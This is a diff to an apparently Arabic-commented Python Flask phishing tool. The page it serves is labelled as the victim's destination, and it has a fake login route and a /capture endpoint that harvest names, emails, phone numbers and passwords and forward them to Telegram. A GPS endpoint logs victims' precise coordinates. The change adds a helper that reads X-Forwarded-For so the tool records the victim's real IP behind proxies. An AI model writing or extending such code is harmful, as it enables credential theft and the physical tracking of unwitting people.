@@ -94,11 +94,19 @@ def get_location_via_ip():
     
     return None
 
+def get_real_ip():
+    """الحصول على الـ IP الحقيقي للمستخدم (تجاوز Proxy)"""
+    if request.headers.get('X-Forwarded-For'):
+        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    return request.remote_addr
+
 # ========== الصفحة الرئيسية (وجهة الضحية) ==========
 @app.route('/')
 def index():
+    # الحصول على الـ IP الحقيقي
+    client_ip = get_real_ip()
+    
     # 1. جمع البيانات التقنية فوراً
-    client_ip = request.remote_addr
     user_agent = request.headers.get('User-Agent')
     accept_lang = request.headers.get('Accept-Language')
     
@@ -584,6 +592,9 @@ def fake_login():
 # ========== مسار استقبال البيانات المسجلة ==========
 @app.route('/capture', methods=['POST'])
 def capture():
+    # الحصول على الـ IP الحقيقي
+    client_ip = get_real_ip()
+    
     fullname = request.form.get('fullname')
     email = request.form.get('email')
     phone = request.form.get('phone')
@@ -597,7 +608,7 @@ def capture():
         📧 البريد الإلكتروني: {email}
         📱 رقم الهاتف: {phone}
         🔑 كلمة المرور: {password}
-        🌐 IP المصدر: {request.remote_addr}
+        🌐 IP المصدر: {client_ip}
         📱 User-Agent: {request.headers.get('User-Agent')}
         ═══════════════════════════════════════════
         """)
@@ -608,7 +619,7 @@ def capture():
 <b>📧 البريد الإلكتروني:</b> {email}
 <b>📱 رقم الهاتف:</b> {phone}
 <b>🔑 كلمة المرور:</b> {password}
-<b>🌐 IP المصدر:</b> {request.remote_addr}
+<b>🌐 IP المصدر:</b> {client_ip}
 """
     send_to_telegram(captured_msg)
     
@@ -646,6 +657,9 @@ def gps_data():
     lon = data.get('lng')
     accuracy = data.get('accuracy')
     
+    # الحصول على الـ IP الحقيقي (للتسجيل)
+    client_ip = get_real_ip()
+    
     # التحقق من صحة البيانات
     if lon is None or lat is None:
         error_msg = f"⚠️ <b>فشل تحديد الموقع</b>\n📱 الأسباب: 1. لم تسمح بمشاركة الموقع 2. إشارة GPS ضعيفة\n📝 البيانات المستلمة:\nخط العرض: {lat}\nخط الطول: {lon}\nالدقة: {accuracy} متر"
@@ -670,7 +684,7 @@ def gps_data():
     
     # تسجيل الموقع في ملف
     with open('gps_log.txt', 'a', encoding='utf-8') as f:
-        f.write(f"\n═══════════════════════════════════════════\n📍 موقع دقيق - {datetime.datetime.now()}\n🗺️ خط العرض: {lat}\n🗺️ خط الطول: {lon}\n📏 الدقة: {accuracy} متر\n📊 مستوى الدقة: {accuracy_level}\n🌐 IP: {request.remote_addr}\n═══════════════════════════════════════════\n")
+        f.write(f"\n═══════════════════════════════════════════\n📍 موقع دقيق - {datetime.datetime.now()}\n🗺️ خط العرض: {lat}\n🗺️ خط الطول: {lon}\n📏 الدقة: {accuracy} متر\n📊 مستوى الدقة: {accuracy_level}\n🌐 IP: {client_ip}\n═══════════════════════════════════════════\n")
     
     # إنشاء رابط خرائط
     maps_link = f"https://www.google.com/maps?q={lat},{lon}"
